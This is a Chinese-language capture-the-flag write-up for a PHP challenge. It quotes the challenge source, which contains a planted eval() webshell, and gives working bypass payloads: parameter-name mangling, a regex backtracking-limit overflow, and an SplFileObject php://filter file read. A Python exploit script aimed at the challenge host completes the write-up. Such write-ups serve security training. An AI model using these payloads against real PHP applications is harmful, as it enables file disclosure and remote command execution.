### 1z_php

---

```php
<?php
highlight_file('index.php');
# 我记得她...好像叫flag.php吧？
$emp=$_GET['e_m.p'];
$try=$_POST['try'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514到底是啥意思嘞？。？");
}
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST['shell'];
eval($shell);
?>
```

#### 第一部分：

```php
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";
```

这个比较简单"e[m.p": "114514.1",注意细节

#### 第二部分：

```php
    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }
```

这个利用正则回溯绕过

https://xz.aliyun.com/t/10219?u_atoken=d2c429b84de1a90e423975d243d53d89&u_asig=ac11000117270958151835305e0079

看这篇文章



#### 最后一步

```php
    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
```

```
    "a": "SplFileObject",
    "b": "php://filter/read=convert.base64-encode/resource=flag.php",
    "c": "__toString"
```





最后直接使用Python一条龙了

```python
import requests
import base64
url = "http://gz.imxbt.cn:20120/"

data ={
    'try':"-"*1000001+"HACKER",
    'shell':"whoami"
}

parms = {
    "e[m.p": "114514.1",
    "a": "SplFileObject",
    "b": "php://filter/read=convert.base64-encode/resource=flag.php",
    "c": "__toString"
}


r = requests.post(url=url, data=data, params=parms)
print(r.text)


str = "你的base64编码值"
byt= base64.b64decode(str)
print(byt)
print(byt.decode("utf-8"))
```

